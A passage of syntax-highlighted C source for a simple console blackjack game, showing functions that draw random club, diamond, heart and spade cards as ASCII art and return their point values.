    k<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 9 or less, print card with that number</span>
    <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//Club Card</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  %d  |\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 10, print card with J (Jack) on face</span>
    <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//Club Card</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  J  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11, print card with A (Ace) on face</span>
    <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//Club Card</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  A  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is Ace, change value to 11 or 1 depending on dealer total</span>
         <span class="token punctuation">{</span>
             k<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>

         <span class="token keyword">else</span>
         <span class="token punctuation">{</span>

             k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 12, print card with Q (Queen) on face</span>
    <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//Club Card</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  Q  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 13, print card with K (King) on face</span>
    <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//Club Card</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  K  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> k<span class="token punctuation">;</span>           
<span class="token punctuation">}</span><span class="token comment" spellcheck="true">// End function</span>

<span class="token keyword">int</span> <span class="token function">diamondcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Displays Diamond Card Image</span>
<span class="token punctuation">{</span>


    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>
    k<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 9 or less, print card with that number</span>
    <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//Diamond Card</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  %d  |\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 10, print card with J (Jack) on face</span>
    <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//Diamond Card</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  J  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11, print card with A (Ace) on face</span>
    <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//Diamond Card</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  A  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is Ace, change value to 11 or 1 depending on dealer total</span>
         <span class="token punctuation">{</span>
             k<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>

         <span class="token keyword">else</span>
         <span class="token punctuation">{</span>
             k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 12, print card with Q (Queen) on face</span>
    <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//Diamond Card</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  Q  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 13, print card with K (King) on face</span>
    <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//Diamond Card</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  K  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> k<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token comment" spellcheck="true">// End function</span>

<span class="token keyword">int</span> <span class="token function">heartcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Displays Heart Card Image</span>
<span class="token punctuation">{</span>


    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>
    k<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 9 or less, print card with that number</span>
    <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//Heart Card</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  %d  |\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 10, print card with J (Jack) on face</span>
    <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//Heart Card</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  J  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11, print card with A (Ace) on face</span>
    <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//Heart Card</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  A  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is Ace, change value to 11 or 1 depending on dealer total</span>
         <span class="token punctuation">{</span>
             k<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>

         <span class="token keyword">else</span>
         <span class="token punctuation">{</span>
             k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 12, print card with Q (Queen) on face</span>
    <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//Heart Card</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  Q  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 13, print card with K (King) on face</span>
    <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//Heart Card</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  K  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> k<span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span>

<span class="token keyword">int</span> <span class="token function">spadecard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Displays Spade Card Image</span>
<span class="token punctuation">{</span>


    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>
    k<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 9 or less, print card with that number</span>
    <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//Spade Card</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  %d  |\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 10, print card with J (Jack) on face</span>
    <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//Spade Card</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  J  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11, print card with A (Ace) on face</span>
    <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//Spade Card</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  A  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is Ace, change value to 11 or 1 depending on dealer total</span>
         <span class="token punctuation">{</span>
             k<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>

         <span class="token keyword">else</span>
         <span class="token punctuation">{</span>
             k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 12, print card with Q (Queen) on face</span>
    <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//Spade Card</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  Q  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 13, print card with K (King) on face</span>
    <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//Spade Card</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  K  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> k<span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span>

<span class="token keyword">int</span> <span class="token function">randcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Generates random card</span>
<span class="token punctuation">{</span>


     <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>
     random_card <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>

     <span class="token keyword">if</span><span class="token punctuation">(</span>random_card<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>
     <span class="token punctuation">{</span>   
         <span class="token function">clubcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         l<span class="token operator">=</span>k<span class="token punctuation">;</span>
     <span class="token punctuation">}</span>

     <span class="token keyword">if</span><span class="token punctuation">(</span>random_card<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>
     <span class="token punctuation">{</span>
         <span class="token function">diamondcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         l<span class="token operator">=</span>k<span class="token punctuation">;</span>
     <span class="token punctuation">}</span>

     <span class="token keyword">if</span><span class="token punctuation">(</span>random_card<span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">)</span>
     <span class="token punctuation">{</span>
         <span class="token function">heartcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         l<span class="token operator">=</span>k<span class="token punctuation">;</span>
     <span class="token punctuation">}</span>

